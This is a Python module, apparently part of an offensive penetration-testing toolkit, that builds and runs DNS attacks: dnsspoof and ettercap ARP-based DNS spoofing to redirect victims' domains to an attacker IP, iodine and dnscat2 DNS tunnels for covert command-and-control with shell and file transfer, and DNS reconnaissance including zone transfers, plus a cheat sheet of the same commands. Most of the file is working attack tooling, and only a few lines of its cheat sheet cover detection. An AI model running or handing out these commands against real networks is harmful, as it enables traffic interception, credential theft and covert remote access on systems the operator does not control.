"""DNS Spoofing & Tunneling Module - DNS poisoning, redirection, and covert DNS tunnels."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "dns_spoof"


def _create_hosts_file(session):
    """Create a spoofed hosts file for dnsspoof/ettercap."""
    info("Create a hosts file mapping domains to your IP.")
    attacker_ip = ask("Enter your (attacker) IP address")
    domains = []
    while True:
        domain = ask("Enter domain to spoof (blank to finish)")
        if not domain:
            break
        domains.append(domain)

    if not domains or not attacker_ip:
        error("Need at least one domain and attacker IP.")
        return None

    hosts_path = "/tmp/dnsspoof_hosts.txt"
    with open(hosts_path, "w") as f:
        for domain in domains:
            f.write(f"{attacker_ip}\t{domain}\n")
            f.write(f"{attacker_ip}\t*.{domain}\n")

    success(f"Hosts file written to {hosts_path}")
    console.print(f"  [dim]Entries: {len(domains)} domains → {attacker_ip}[/dim]")
    return hosts_path


def _dnsspoof(session):
    """DNS spoof using dnsspoof (dsniff package)."""
    iface = ask("Enter network interface (e.g., eth0)")
    hosts_file = _create_hosts_file(session)
    if not hosts_file:
        return

    warning("[!] This will intercept and spoof DNS responses on the network.")
    if not confirm("Start DNS spoofing?"):
        return

    cmd = f"dnsspoof -i {iface} -f {hosts_file}"
    run_with_preview(cmd, session, STAGE)


def _ettercap_dns(session):
    """DNS spoofing via ettercap dns_spoof plugin."""
    iface = ask("Enter network interface")
    target = ask("Enter target IP (or leave blank for all)")

    info("You need to edit ettercap's etter.dns file with your spoofed entries.")
    if confirm("Create/edit etter.dns entries now?"):
        attacker_ip = ask("Enter your IP for DNS redirection")
        domain = ask("Enter domain to spoof")
        if attacker_ip and domain:
            dns_entry = f"{domain} A {attacker_ip}"
            info(f"Add this to /etc/ettercap/etter.dns:")
            console.print(f"  [bold green]{dns_entry}[/bold green]")
            if confirm("Append to etter.dns automatically?"):
                run_with_preview(f'echo "{dns_entry}" >> /etc/ettercap/etter.dns', session, STAGE)

    if target:
        cmd = f"ettercap -T -i {iface} -M arp:remote /{target}// -P dns_spoof"
    else:
        cmd = f"ettercap -T -i {iface} -M arp:remote -P dns_spoof"

    run_with_preview(cmd, session, STAGE)


def _iodine_tunnel(session):
    """DNS tunneling via iodine."""
    options = [
        ("1", "[bold]Server mode[/bold]  - Start iodine server (on your VPS)"),
        ("2", "[bold]Client mode[/bold]  - Connect to iodine server"),
    ]
    choice = show_menu(options)

    if choice == "1":
        domain = ask("Enter tunnel domain (e.g., t1.yourdomain.com)")
        server_ip = ask("Enter server tunnel IP (e.g., 10.0.0.1)")
        password = ask("Enter tunnel password")
        cmd = f"iodined -f -c -P {password} {server_ip} {domain}"
        run_with_preview(cmd, session, STAGE)

    elif choice == "2":
        domain = ask("Enter tunnel domain (e.g., t1.yourdomain.com)")
        password = ask("Enter tunnel password")
        cmd = f"iodine -f -P {password} {domain}"
        run_with_preview(cmd, session, STAGE)
        info("After connection, use dns0 interface for tunneled traffic.")
        info("Example: ssh user@10.0.0.1 -o ProxyCommand='nc -w 1 %h %p'")


def _dnscat2(session):
    """DNS tunneling via dnscat2."""
    options = [
        ("1", "[bold]Server mode[/bold]  - Start dnscat2 server"),
        ("2", "[bold]Client mode[/bold]  - Connect to dnscat2 server"),
    ]
    choice = show_menu(options)

    if choice == "1":
        domain = ask("Enter domain for DNS tunnel (or blank for direct)")
        if domain:
            cmd = f"ruby dnscat2.rb {domain}"
        else:
            cmd = "ruby dnscat2.rb --dns 'server=0.0.0.0,port=53'"
        info("dnscat2 server commands: sessions, session -i <id>, shell, download, upload")
        run_with_preview(cmd, session, STAGE)

    elif choice == "2":
        server = ask("Enter dnscat2 server domain or IP")
        secret = ask("Enter pre-shared secret (or blank)")
        if secret:
            cmd = f"./dnscat --dns domain={server} --secret={secret}"
        else:
            cmd = f"./dnscat --dns domain={server}"
        run_with_preview(cmd, session, STAGE)


def _dns_enum(session):
    """DNS enumeration and reconnaissance."""
    target = ask("Enter target domain")
    if not target:
        error("Domain required.")
        return

    options = [
        ("1", "[bold]All records[/bold]   - dig ANY"),
        ("2", "[bold]Zone transfer[/bold] - dig AXFR"),
        ("3", "[bold]Reverse lookup[/bold]- dig PTR"),
        ("4", "[bold]DNSRecon[/bold]      - Full DNS recon"),
        ("5", "[bold]Fierce[/bold]        - DNS bruteforce"),
    ]
    choice = show_menu(options)

    cmds = {
        "1": f"dig {target} ANY +noall +answer",
        "2": f"dig @$(dig +short NS {target} | head -1) {target} AXFR",
        "3": f"dig -x {target} +short",
        "4": f"dnsrecon -d {target} -a",
        "5": f"fierce --domain {target}",
    }
    if choice in cmds:
        run_with_preview(cmds[choice], session, STAGE)


def _cheat_sheet():
    """Display DNS spoofing cheat sheet."""
    content = """# DNS Spoofing & Tunneling Cheat Sheet

## DNS Spoofing
```
# dnsspoof (dsniff)
echo "192.168.1.100 *.target.com" > hosts.txt
dnsspoof -i eth0 -f hosts.txt

# ettercap DNS plugin
# Edit /etc/ettercap/etter.dns first
ettercap -T -M arp -P dns_spoof
```

## DNS Tunneling
```
# iodine (fast, IP-over-DNS)
# Server: iodined -f -c -P pass 10.0.0.1 t1.yourdomain.com
# Client: iodine -f -P pass t1.yourdomain.com

# dnscat2 (C2 over DNS)
# Server: ruby dnscat2.rb yourdomain.com
# Client: ./dnscat --dns domain=yourdomain.com
```

## DNS Enumeration
```
dig target.com ANY +noall +answer
dig @ns1.target.com target.com AXFR
dnsrecon -d target.com -a
fierce --domain target.com
dnsenum target.com
```

## Detection
- Monitor for unusual DNS query volume
- Look for TXT/NULL record queries (tunneling)
- DNS query length anomalies (>50 chars = suspicious)
- Tools: passivedns, dnstop, Suricata
"""
    show_knowledge(content)


def run(session):
    """DNS Spoofing & Tunneling module entry point."""
    show_stage_header("DNS Spoofer", "DNS poisoning, redirection, and covert DNS tunnels")

    while True:
        options = [
            ("1", "[bold]DNS Spoof[/bold]        - dnsspoof MITM attack"),
            ("2", "[bold]Ettercap DNS[/bold]     - DNS spoof via ettercap plugin"),
            ("3", "[bold]Iodine Tunnel[/bold]    - IP-over-DNS tunneling"),
            ("4", "[bold]dnscat2 Tunnel[/bold]   - C2 over DNS"),
            ("5", "[bold]DNS Enumeration[/bold]  - Recon & zone transfers"),
            ("6", "[bold]Create Hosts File[/bold]- Build spoofed hosts file"),
            ("7", "[bold]Cheat Sheet[/bold]      - DNS spoofing reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _dnsspoof(session)
        elif choice == "2":
            _ettercap_dns(session)
        elif choice == "3":
            _iodine_tunnel(session)
        elif choice == "4":
            _dnscat2(session)
        elif choice == "5":
            _dns_enum(session)
        elif choice == "6":
            _create_hosts_file(session)
        elif choice == "7":
            _cheat_sheet()
